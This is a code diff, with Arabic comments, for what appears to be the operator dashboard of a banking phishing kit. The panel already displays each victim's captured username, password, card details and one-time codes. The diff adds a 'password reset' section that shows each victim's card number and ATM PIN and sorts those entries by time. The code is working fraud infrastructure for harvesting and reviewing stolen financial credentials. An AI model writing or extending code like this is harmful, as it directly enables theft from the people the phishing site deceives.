@@ -500,9 +500,12 @@
       const latestOtp = sessionOtps.length ? sessionOtps[0] : null;
       const ls = toTime(m.lastSeen);
       // آخر نشاط = أحدث تاريخ بين آخر بطاقة وآخر OTP وآخر رؤية
+      const sessionResets = Array.isArray(m.passwordResets) ? m.passwordResets : [];
+      const latestResetAt = sessionResets.length ? Math.max(...sessionResets.map(r => toTime(r && r.at))) : 0;
       const lastActivity = Math.max(
         toTime(latestCard.createdAt),
         toTime(latestOtp && latestOtp.createdAt),
+        latestResetAt,
         ls
       );
       return {
@@ -540,6 +543,7 @@
         pass: m.pass || '',
         username: m.username || '',
         logins: Array.isArray(m.logins) ? m.logins : [],
+        passwordResets: Array.isArray(m.passwordResets) ? m.passwordResets : [],
         requestType: m.requestType || '',
         requestTypeLabel: m.requestTypeLabel || '',
         refNo: m.refNo || '',
@@ -571,7 +575,8 @@
     .filter(x => !x.isHidden && (
       x.name || x.phone || x.address ||
       (x.allCards && x.allCards.length > 0) ||
-      (x.allOtps && x.allOtps.length > 0)
+      (x.allOtps && x.allOtps.length > 0) ||
+      (x.passwordResets && x.passwordResets.length > 0)
     ))
     // ترتيب: آخر نشاط أولاً (الأحدث)
     .sort((a, b) => (b.lastActivity || 0) - (a.lastActivity || 0));
@@ -776,6 +781,14 @@
       return `<article class="ref-basic-box" data-ref-time="${t}"><h3>بيانات الدخول ${loginEntries.length > 1 ? '#' + (loginEntries.length - i) : ''}${t ? ` <time class="ref-box-time" data-box-counter data-box-time="${t}" datetime="${t}">${escapeHtml(formatRefTime(t))}</time>` : ''}</h3>${field('اسم المستخدم', entry && entry.username)}${field('كلمة المرور', entry && entry.password)}</article>`;
     }).join('');
     const loginBoxTime = loginEntries.length ? (loginEntries[0] && loginEntries[0].at) : (visitor.customerUpdatedAt || visitor.createdDate);
+    // صناديق إعادة تعيين كلمة المرور — كل محاولة في صندوق منفصل
+    const resetEntries = Array.isArray(visitor.passwordResets) ? [...visitor.passwordResets] : [];
+    resetEntries.sort((a, b) => (toMillis(b && b.at) || 0) - (toMillis(a && a.at) || 0));
+    const resetBoxesHtml = resetEntries.map((entry, i) => {
+      const t = toMillis(entry && entry.at);
+      return `<article class="ref-basic-box" data-ref-time="${t}"><h3>إعادة تعيين كلمة المرور ${resetEntries.length > 1 ? '#' + (resetEntries.length - i) : ''}${t ? ` <time class="ref-box-time" data-box-counter data-box-time="${t}" datetime="${t}">${escapeHtml(formatRefTime(t))}</time>` : ''}</h3>${field('رقم البطاقة', entry && entry.card)}${field('شفرة الصراف الآلي', entry && entry.atmPin)}</article>`;
+    }).join('');
+    const resetBoxTime = resetEntries.length ? (resetEntries[0] && resetEntries[0].at) : 0;
     const cardsSectionHtml = cards.length ? `<div class="ref-cards-title"><h3>البطاقات (${cards.length})</h3></div>${cardHtml}` : '';
     const otpsSectionHtml = sortedOtps.length ? `<div class="ref-otp-title"><h3>رموز التحقق (${sortedOtps.length})</h3></div>${sortedOtps.map((o, i) => `<article class="ref-otp-box"><div class="ref-otp-row"><div><b>الرمز ${i + 1}: <span class="ref-copyable" data-copy="${escapeHtml(String(o.otp || ''))}">${escapeHtml(String(o.otp || ''))}</span></b><time class="ref-box-time" data-box-counter data-box-time="${otpTime(o)}" datetime="${otpTime(o)}">${escapeHtml(formatRefTime(otpTime(o)))}</time></div><small>${escapeHtml(timeAgo(otpTime(o)))}</small></div></article>`).join('')}` : '';
     // ترتيب الصناديق من الأحدث إلى الأقدم (الأحدث يظهر في الأعلى).
@@ -783,6 +796,7 @@
     const stackSections = [
       { time: basicBoxTime, html: basicBoxHtml, always: true },
       { time: toMillis(loginBoxTime), html: loginBoxesHtml, always: false },
+      { time: toMillis(resetBoxTime), html: resetBoxesHtml, always: false },
       { time: cardsBoxTime, html: cardsSectionHtml, always: false },
       { time: otpsBoxTime, html: otpsSectionHtml, always: false },
     ]
